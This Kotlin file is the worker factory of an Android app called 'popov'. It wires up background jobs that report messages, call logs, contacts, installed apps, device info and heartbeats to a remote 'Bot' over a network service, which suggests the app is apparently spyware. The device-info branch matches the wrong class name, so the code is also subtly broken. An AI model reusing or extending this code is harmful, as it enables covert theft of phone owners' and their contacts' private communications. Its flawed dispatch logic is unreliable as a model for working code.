package com.github.yohannestz.popov.worker

import android.content.Context
import android.util.Log
import androidx.work.ListenableWorker
import androidx.work.WorkerFactory
import androidx.work.WorkerParameters
import com.github.yohannestz.popov.data.local.ApplicationsRepository
import com.github.yohannestz.popov.data.local.CallRepository
import com.github.yohannestz.popov.data.local.ContactsRepository
import com.github.yohannestz.popov.data.local.DeviceInfoRepository
import com.github.yohannestz.popov.data.local.MessageRepository
import com.github.yohannestz.popov.data.model.Bot
import com.github.yohannestz.popov.data.remote.NetworkService

class PopovWorkerFactory(
    private val messageRepository: MessageRepository,
    private val contactsRepository: ContactsRepository,
    private val callRepository: CallRepository,
    private val deviceInfoRepository: DeviceInfoRepository,
    private val applicationsRepository: ApplicationsRepository,
    private val networkService: NetworkService,
    private val bot: Bot
): WorkerFactory() {

    override fun createWorker(
        appContext: Context,
        workerClassName: String,
        workerParameters: WorkerParameters
    ): ListenableWorker? {
        return when(workerClassName) {
            AppsLogReportWorker::class.java.name ->
                AppsLogReportWorker(appContext, workerParameters, applicationsRepository, networkService, bot)
            CallLogReportWorker::class.java.name ->
                CallLogReportWorker(appContext, workerParameters, callRepository, networkService, bot)
            ContactsLogReportWorker::class.java.name ->
                ContactsLogReportWorker(appContext, workerParameters, bot, networkService, contactsRepository)
            DeviceInfoRepository::class.java.name ->
                DeviceInfoReportWorker(appContext, workerParameters, deviceInfoRepository, bot, networkService)
            HeartBeatReportWorker::class.java.name ->
                HeartBeatReportWorker(appContext, workerParameters, bot, networkService)
            MessageLogReportWorker::class.java.name ->
                MessageLogReportWorker(appContext, workerParameters, messageRepository, networkService, bot)
            else -> {
                Log.e("WorkerFactory", "not found for $workerClassName")
                return null
            }
        }
    }
}